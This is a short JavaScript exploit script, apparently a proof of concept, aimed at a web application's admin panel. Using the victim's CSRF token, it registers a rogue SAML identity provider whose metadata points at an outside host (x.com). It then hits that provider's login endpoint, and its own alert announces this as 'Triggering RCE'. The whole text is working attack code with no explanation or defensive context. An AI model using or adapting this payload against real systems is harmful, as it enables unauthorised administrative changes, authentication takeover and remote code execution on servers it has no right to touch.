(function() {
     const id = Math.floor(Math.random() * 9999);
     const slug = 'debug-' + id;
     const name = 'Debug' + id; // No newline yet

     $.post('/admin/uac/identityprovider/add/', {
         csrfmiddlewaretoken: Cookies.get('csrftoken'),
         name: name,
         slug: slug,
         protocol: 'saml',
         status: 'active',
         use_custom_attribute_map: 'on',
         attribute_mapping: '{"email":["mail"]}',
         saml_metadata_xml: '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
 protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
 Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>',
         _save: 'Save'
     }).done(function(data, textStatus, jqXHR) {
         if (jqXHR.status === 200 && data.includes('errorlist')) {
             alert("Validation Error! Check console for details.");
             console.log(data);
         } else {
             alert("IDP Created! Triggering RCE...");
             $.get('/saml2/login/' + slug + '/');
         }
     });
 })();

